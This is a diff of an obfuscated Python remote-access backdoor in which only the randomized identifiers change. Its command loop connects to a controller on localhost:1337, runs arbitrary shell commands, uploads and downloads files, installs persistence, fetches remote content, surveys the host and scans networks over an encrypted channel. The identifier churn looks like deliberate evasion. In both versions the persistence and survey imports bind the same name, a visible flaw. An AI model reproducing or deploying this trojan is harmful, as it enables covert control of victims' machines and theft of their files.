@@ -5,60 +5,60 @@ import subprocess
 import struct
 import sys
 try:
-    from core.crypto import CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR, aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu, uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc
-    from core.filesock import CJaDqhybJXLaLvKovpVOBoslaLrUFgCi, fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB
-    from core.persistence import XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp
-    from core.scan import GTNwDzYuHtAruxpPMVsjCisGlsWOQvoR
-    from core.survey import XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp
-    from core.toolkit import MvsxOckMDUuCxUTEMjPxoqmnxnPPluSc, tAwBBLJuYUpjfKGKmoHiMchedOirrdBI
-except ImportError as YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF:
-    print(YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF)
+    from core.crypto import sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ, rupicluuYAUuPXtZzzprBLFiIHrFbgdx, GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm
+    from core.filesock import sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe, uwhiOqBSmedbvGGpKrsruHWAGHrUprFP
+    from core.persistence import JJyEbjrynmapUHJCDQUQjcshajVjEFwA
+    from core.scan import kVoQssmhUOQyeWHSppGMduiAtsJGjVOP
+    from core.survey import JJyEbjrynmapUHJCDQUQjcshajVjEFwA
+    from core.toolkit import hBwkweoTQVWRFtCiQwUrBWIrKqSmTGBP, RhnTmTNQqHkoWkxISbScOYnmfkMKbIBB
+except ImportError as nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk:
+    print(nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk)
     sys.exit(0)
-iUQeRwxkQXERLqvnjZbaVoeoyUIHnJVk = sys.platform
-xSLUfJrbitSkbINiHIdiGAYnnZxzkzBb      = 'localhost'
-VSBWrGBSKZaleaBcBtavpVRMYfAWdirD      = 1337
-wiakvVQTpzJqrLISsvGBwPmKhkusZqOk    = 'b14ce95fa4c33ac2803782d18341869f'
-def dzIXxNJjKrHldXbZNcDmXhAACACtFDWk():
-    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb = socket.socket()
-    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.connect((xSLUfJrbitSkbINiHIdiGAYnnZxzkzBb, VSBWrGBSKZaleaBcBtavpVRMYfAWdirD))
-    ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb)
+dldffcicSVHYEqAwmSwpsAjoihTiQtfo = sys.platform
+QKXfbgeIywQJugBtvNEdAecGOByjqzEa      = 'localhost'
+BrTysZoSjaLciyLUvtvmWuHNyRXHhOKS      = 1337
+MiVrtvzWkBxahaWDOaCsziWcKSHHnCEx    = 'b14ce95fa4c33ac2803782d18341869f'
+def kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO():
+    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA = socket.socket()
+    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.connect((QKXfbgeIywQJugBtvNEdAecGOByjqzEa, BrTysZoSjaLciyLUvtvmWuHNyRXHhOKS))
+    JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA)
     while True:
-        naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc = WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.recv(1024)
-        naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc = CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR(naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
-        MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud, _, gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy = naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc.partition(' ')
-        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'quit':
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.close()
+        dkRnsuwlwyECsxXAOdayukBIhcJUHDgY = DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.recv(1024)
+        dkRnsuwlwyECsxXAOdayukBIhcJUHDgY = sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ(dkRnsuwlwyECsxXAOdayukBIhcJUHDgY, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
+        KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS, _, zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO = dkRnsuwlwyECsxXAOdayukBIhcJUHDgY.partition(' ')
+        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'quit':
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.close()
             sys.exit(0)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'run':
-            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = subprocess.Popen(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy, shell=True,
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'run':
+            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = subprocess.Popen(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
-            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO.stdout.read() + WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO.stderr.read()
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.sendall(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'download':
-            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
-                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
-                fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'upload':
-            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
-                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
-                CJaDqhybJXLaLvKovpVOBoslaLrUFgCi(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'rekey':
-            ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'persistence':
-            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp(iUQeRwxkQXERLqvnjZbaVoeoyUIHnJVk)
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'wget':
-            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = MvsxOckMDUuCxUTEMjPxoqmnxnPPluSc(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy)
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'unzip':
-            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = tAwBBLJuYUpjfKGKmoHiMchedOirrdBI(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy)
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'survey':
-            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp(iUQeRwxkQXERLqvnjZbaVoeoyUIHnJVk)
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'scan':
-            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = GTNwDzYuHtAruxpPMVsjCisGlsWOQvoR(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy)
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
+            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = jLhewPiHvUwpJiUUvJccqlnCSUWejxGe.stdout.read() + jLhewPiHvUwpJiUUvJccqlnCSUWejxGe.stderr.read()
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.sendall(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'download':
+            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
+                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
+                uwhiOqBSmedbvGGpKrsruHWAGHrUprFP(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'upload':
+            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
+                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
+                sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'rekey':
+            JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA)
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'persistence':
+            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = JJyEbjrynmapUHJCDQUQjcshajVjEFwA(dldffcicSVHYEqAwmSwpsAjoihTiQtfo)
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'wget':
+            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = hBwkweoTQVWRFtCiQwUrBWIrKqSmTGBP(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO)
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'unzip':
+            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = RhnTmTNQqHkoWkxISbScOYnmfkMKbIBB(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO)
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'survey':
+            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = JJyEbjrynmapUHJCDQUQjcshajVjEFwA(dldffcicSVHYEqAwmSwpsAjoihTiQtfo)
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'scan':
+            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = kVoQssmhUOQyeWHSppGMduiAtsJGjVOP(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO)
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
 if __name__ == '__main__':
-    dzIXxNJjKrHldXbZNcDmXhAACACtFDWk()
+    kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO()
